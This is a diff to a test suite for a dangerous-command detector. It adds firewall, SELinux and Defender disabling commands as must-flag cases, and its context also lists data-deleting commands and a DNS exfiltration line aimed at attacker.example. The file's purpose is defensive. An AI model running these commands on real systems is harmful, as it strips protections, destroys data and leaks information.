@@ -130,6 +130,15 @@ def test_catastrophic(line):
     "firebase firestore:delete --all-collections",
     "bq rm -r -f dataset",
 
+    # Commands that switch off protection (#26)
+    "ufw disable",
+    "iptables -F",
+    "iptables --flush",
+    "nft flush ruleset",
+    "netsh advfirewall set allprofiles state off",
+    "setenforce 0",
+    "Set-MpPreference -DisableRealtimeMonitoring $true",
+
     # Skipping git hooks (#172)
     "git commit --no-verify -m x",
     "git push --no-verify",
@@ -240,6 +249,14 @@ def test_no_false_alarm(line):
     "firebase firestore:indexes",
     "bq ls",
 
+    # Checking firewall or security status (#26)
+    "ufw status",
+    "iptables -L",
+    "iptables -A INPUT -f -j DROP",     # lowercase -f matches fragments, it doesn't flush
+    "nft -f /etc/nftables.conf",        # loads rules from a file
+    "netsh advfirewall show allprofiles",
+    "getenforce",
+
     # Everyday git work without --no-verify (#172)
     "git commit -m fix",
     "git push origin main",
@@ -288,6 +305,7 @@ def test_summary_explains():
     assert "APFS" in commands.read("diskutil apfs deleteContainer disk2").summary()
     assert "backup" in commands.read("tmutil delete /Volumes/Backup/x").summary()
     assert "DNS name" in commands.read("nslookup $(whoami).attacker.example").summary()
+    assert "firewall" in commands.read("ufw disable").summary()
     assert "skips the repository's own checks (git hooks)" in commands.read("git commit --no-verify -m x").summary()
     assert "takes a published version away" in commands.read("cargo yank --version 1.0.0").summary()
     assert "erases the record of what ran" in commands.read("history -c").summary()
